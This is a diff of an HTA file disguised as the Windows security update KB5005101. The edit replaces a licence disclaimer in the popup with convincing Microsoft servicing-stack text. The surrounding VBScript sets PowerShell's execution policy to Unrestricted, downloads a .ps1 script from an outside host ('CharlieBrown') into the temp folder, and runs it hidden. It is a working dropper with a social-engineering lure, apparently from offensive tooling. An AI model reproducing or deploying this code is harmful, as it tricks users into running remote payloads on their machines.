@@ -3,7 +3,7 @@
 <script>
    path = document.URL
    document.write(
-      '<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="KB5005101" SHOWINTASKBAR="yes" ICON="uri_icon_data">'
+      '<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="KB5005101 "21H1" SHOWINTASKBAR="yes" ICON="uri_icon_data">'
    );
 </script>
 
@@ -13,7 +13,7 @@
 
 <SCRIPT LANGUAGE="VBScript">
    visible = false
-   CreateObject("wscript.shell").popup "THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.", 3, "KB5005101 21H1 Security Update", 1
+      CreateObject("wscript.shell").popup "Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161" & vbcrlf & "This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.", 3, "KB5005101 21H1 Security Update", 1
    set ObjSSLprovider = CreateObject("WScript.Shell")
    ObjSSLprovider.run("cmd /R echo Y|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser && powershell cd $Env:TMP;iwr -uri 'http://CharlieBrown/Update-KB5005101.ps1' -outfile 'Update-KB5005101.ps1';powershell -W 1 -file 'Update-KB5005101.ps1'"), visible
    window.close()
